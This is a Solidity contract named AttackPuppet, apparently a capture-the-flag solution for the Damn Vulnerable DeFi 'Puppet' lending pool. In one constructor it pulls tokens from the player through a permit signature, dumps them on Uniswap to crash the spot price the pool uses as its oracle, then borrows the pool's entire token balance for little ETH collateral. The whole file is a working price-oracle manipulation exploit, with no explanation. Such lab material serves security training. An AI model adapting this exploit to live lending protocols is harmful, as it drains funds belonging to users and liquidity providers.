// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";

interface IUniswap {
    // Trade ERC20 to ETH
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256  eth_bought);
}

contract AttackPuppet {

    constructor(
        address player, 
        address _dvt, 
        address uniswap, 
        address _puppetPool,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        DamnValuableToken dvt = DamnValuableToken(_dvt);
        PuppetPool pool = PuppetPool(_puppetPool);

        //transfer token from caller to contract
        dvt.permit(player, address(this), 1000 ether, deadline, v, r,  s);
        dvt.transferFrom(player, address(this), 1000 ether);
        //swap the borrowed tokens to decrease spot price
        dvt.approve(uniswap, type(uint256).max);
        IUniswap(uniswap).tokenToEthSwapInput(1000 ether, 9 ether, block.timestamp + 100);

        //borrow left
        pool.borrow{value: payable(this).balance}(dvt.balanceOf(address(pool)), player);
    }

    receive() external payable {}
}